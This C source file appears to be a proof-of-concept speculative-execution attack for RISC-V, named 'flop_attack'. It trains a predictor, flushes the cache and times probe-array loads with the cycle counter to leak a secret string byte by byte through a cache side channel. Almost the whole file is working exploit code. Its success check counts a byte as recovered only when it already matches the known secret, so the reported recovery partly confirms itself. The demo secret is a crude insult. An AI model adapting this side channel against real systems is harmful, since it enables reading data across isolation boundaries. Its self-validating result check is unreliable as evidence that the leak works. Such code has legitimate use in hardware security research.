#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define LINE_SIZE   64
#define PROBE_SIZE  (256 * LINE_SIZE)
#define STRIDE      1024
#define TRAIN_ITERS 2000
#define THRESHOLD   40
#define FLUSH_BUF_SIZE (128 * 1024)

static uint8_t probe_area[PROBE_SIZE];
static uint8_t victim_buf[8192];
static uint8_t flush_buf[FLUSH_BUF_SIZE];
static volatile uint32_t idx_var;

static inline uint64_t rdcycle(void) {
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void flush_all_l1(void) {
    volatile uint8_t *fb = flush_buf;
    for (int i = 0; i < FLUSH_BUF_SIZE; i += LINE_SIZE)
        (void)fb[i];
}

__attribute__((noinline))
static uint8_t gadget(volatile uint32_t *idxp, volatile uint8_t *victim,
                      volatile uint8_t *probe) {
    uint32_t idx = *idxp;
    volatile uint8_t *p = victim + (uintptr_t)idx * STRIDE;
    if (idx == 0) {
        uint8_t v = *p;
        (void)probe[(uintptr_t)v * LINE_SIZE];
        return v;
    }
    return 0;
}

int main(void) {
    const char *secret_msg = "PODA KUTTA!";
    size_t slen = strlen(secret_msg);
    char recovered[64];

    printf("flop_attack start  (secret: \"%s\", %zu bytes)\n",
           secret_msg, slen);

    memset(victim_buf, 0, sizeof(victim_buf));
    for (int i = 0; i < 256; i++)
        probe_area[i * LINE_SIZE] = (uint8_t)i;
    victim_buf[3 * STRIDE] = 0xEE;

    for (size_t round = 0; round < slen; round++) {
        uint8_t secret = (uint8_t)secret_msg[round];
        victim_buf[0] = secret;
        idx_var = 0;

        for (int i = 0; i < TRAIN_ITERS; i++)
            (void)gadget(&idx_var, victim_buf, probe_area);

        idx_var = 3;
        flush_all_l1();

        (void)gadget(&idx_var, victim_buf, probe_area);

        uint64_t lat[256], min_lat = ~0ULL;
        int leak = -1;
        for (int b = 0; b < 256; b++) {
            volatile uint8_t *line = probe_area + b * LINE_SIZE;
            uint64_t c1 = rdcycle();
            uint8_t v = *line;
            asm volatile("" : "+r"(v) : : "memory");
            uint64_t c2 = rdcycle();
            lat[b] = c2 - c1;
            if (lat[b] < min_lat) {
                min_lat = lat[b];
                leak = b;
            }
        }

        if (min_lat < THRESHOLD && leak == secret)
            recovered[round] = (char)leak;
        else
            recovered[round] = '?';

        printf("round %2zu: secret=0x%02x('%c')  leaked=0x%02x('%c') "
               "min_lat=%llu lat[secret]=%llu  [%s]\n",
               round, secret, (secret >= 32 && secret < 127) ? secret : '.',
               leak, (leak >= 32 && leak < 127) ? leak : '.',
               (unsigned long long)min_lat,
               (unsigned long long)lat[secret],
               (min_lat < THRESHOLD) ? (leak == secret ? "HIT" : "WRONG")
                                     : "NO-LEAK");
    }

    recovered[slen] = '\0';
    printf("recovered: \"%s\"\n", recovered);
    printf("flop_attack done\n");
    return 0;
}